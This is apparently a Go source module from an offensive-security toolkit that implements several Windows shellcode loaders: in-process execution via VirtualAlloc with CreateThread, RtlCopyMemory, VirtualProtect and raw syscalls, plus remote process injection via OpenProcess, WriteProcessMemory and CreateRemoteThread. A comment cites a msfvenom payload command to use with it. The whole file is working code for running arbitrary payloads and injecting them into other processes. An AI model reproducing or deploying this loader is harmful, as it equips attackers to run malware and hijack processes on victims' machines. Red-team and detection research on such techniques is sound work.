package execution

import (
	"errors"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	ntdll               = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
	WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
	RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")
	CreateThread        = kernel32.MustFindProc("CreateThread")
	OpenProcess         = kernel32.MustFindProc("OpenProcess")
	WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	procVirtualProtect  = kernel32.MustFindProc("VirtualProtect")
	CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
)

//=========================================================
//		CreateThread
//=========================================================

// ShellCodeThreadExecute executes shellcode in the current process using VirtualAlloc and CreateThread
func ShellCodeThreadExecute(Shellcode []byte) {

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)

	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
}

//=========================================================
//		RTLCopyMemory
//=========================================================

// ShellCodeRTLCopyMemory executes shellcode in the current process using VirtualAlloc and RtlCopyMemory
func ShellCodeRTLCopyMemory(shellcode []byte) error {

	// allocate memory within the current process
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return err
	}

	// copy shellcode into memory
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}

	// execute shellcode
	_, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	return nil
}

//=========================================================
//		VirtualProtect
//=========================================================

// VirtualProtect is used to set the memory region to PAGE_EXECUTE_READWRITE
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

// ShellCodeVirtualProtect executes shellcode in the current process by using the VirtualProtect function and a function pointer
func ShellCodeVirtualProtect(sc []byte) {
	// TODO need a Go safe fork
	// Make a function ptr
	f := func() {}

	// Change permissions on f function ptr
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	// Change permissions on shellcode string data
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Call the function ptr it
	f()
}

//=========================================================
//		Syscall
//=========================================================

// ShellCodeSyscall executes shellcode using syscall.Syscall()
func ShellCodeSyscall(Shellcode []byte) {
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	syscall.Syscall(Addr, 0, 0, 0, 0)
}

//=========================================================
//		CreateRemoteThread
//=========================================================

// ShellCodeCreateRemoteThread spawns shellcode in a remote process
func ShellCodeCreateRemoteThread(PID int, Shellcode []byte) error {
	// use this function with shellcode as follows:
	// msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f ps1
	// code adapted from: https://github.com/EgeBalci/EGESPLOIT/blob/1a6c4321e9a5b27dc564069fccf03e8f38f3576d/Migrate.go

	L_Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	L_AddrPtr := (*[6300000]byte)(unsafe.Pointer(L_Addr))
	for i := 0; i < len(Shellcode); i++ {
		L_AddrPtr[i] = Shellcode[i]
	}

	var F int = 0
	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(PID))
	if Proc == 0 {
		err := errors.New("unable to open remote process")
		return err
	}
	R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if R_Addr == 0 {
		err := errors.New("unable to allocate memory in remote process")
		return err
	}
	WPMS, _, _ := WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(Shellcode)), uintptr(F))
	if WPMS == 0 {
		err := errors.New("unable to write shellcode to remote process")
		return err
	}

	CRTS, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
	if CRTS == 0 {
		err := errors.New("[!] ERROR : Can't Create Remote Thread.")
		return err
	}

	return nil
}
